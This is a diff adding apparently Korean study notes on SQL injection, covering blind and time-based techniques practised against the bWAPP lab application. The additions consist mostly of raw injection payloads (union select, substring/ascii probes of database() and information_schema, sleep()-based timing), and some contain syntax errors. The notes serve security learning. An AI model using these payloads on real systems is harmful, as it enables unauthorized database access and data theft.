@@ -875,3 +875,42 @@ SQL Injection?
 
 ### SQL Injection 공격 - Error-Based SQL Injection
 
+Error-Based SQL Injection?
+
+---
+
+### SQL Injection 공격 - Blind SQL Injection
+
+블라인드 SQLi = 진실게임
+
+에러베이스 - 여자친구 누구야? -> 000
+블라인드 -> 여자친구 있어? -> 있어
+           우리 학과생이야? -> 아니야.
+
+' union all select 1, 2, 3, 4, 5#
+' union all select 1, database(), 3, 4, 5, 6, 7#
+
+' or 1=1 and length(database())=1#
+
+' or 1=1 and substring(database(),1,1)='a'#
+' or 1=1 and substring(database(),1,1)='b'#
+' or 1=1 and ascii(substring(database(),1,1))=98#
+
+' or 1=1 and length((select column_name from information_schema.columns where table_name='users' limit(0,1))=2#
+' or 1=1 and substring((select column_name from information_schema.columns where table_name='users' limit(0,1), 1, 1)='i'#
+
+---
+
+### SQL Injection 공격 - Time-Based SQL Injection
+
+' or 1=1 and length(database())=5 and sleep(1)#
+' or 1=1 and length(database())=4 and sleep(1)#
+
+' or 1=1 and length((select table_name from information_schema.tables where table_type='base table' and table_schema='bWAPP' limit 0.1))=4 and sleep(1)#
+
+에러 베이스 -> 블라인드 -> 타임베이스
+
+---
+
+### SQL Injection 공격 - sqlmap 자동화 분석 - 도구 활용 (1)
+
